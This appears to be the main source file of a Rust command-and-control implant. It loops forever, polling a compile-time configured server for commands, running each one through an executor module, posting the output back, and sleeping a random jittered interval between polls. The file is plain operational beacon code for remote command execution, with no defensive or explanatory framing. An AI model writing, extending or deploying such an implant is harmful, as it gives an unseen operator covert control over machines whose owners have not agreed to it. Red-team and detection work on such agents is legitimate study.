mod models;
mod http;
mod executor;

use rand::Rng;
use reqwest::Client;
use tokio::time::{sleep, Duration};
use models::CommandResponse;

#[tokio::main]
async fn main() {
    let base_url = option_env!("BASE_URL").unwrap_or("http://localhost:8000");
    let jitter_min: u64 = option_env!("JITTER_MIN").and_then(|v| v.parse().ok()).unwrap_or(3);
    let jitter_max: u64 = option_env!("JITTER_MAX").and_then(|v| v.parse().ok()).unwrap_or(7);
    let client = Client::new();

    loop {
        if let Some(cmd) = http::get_command(&client, base_url).await {
            let output = executor::execute(&cmd.command).await;

            http::send_response(&client, base_url, cmd.id, &CommandResponse {
                status: "DONE".to_string(),
                output,
            })
            .await;
        }

        let secs = rand::thread_rng().gen_range(jitter_min..=jitter_max);
        sleep(Duration::from_secs(secs)).await;
    }
}
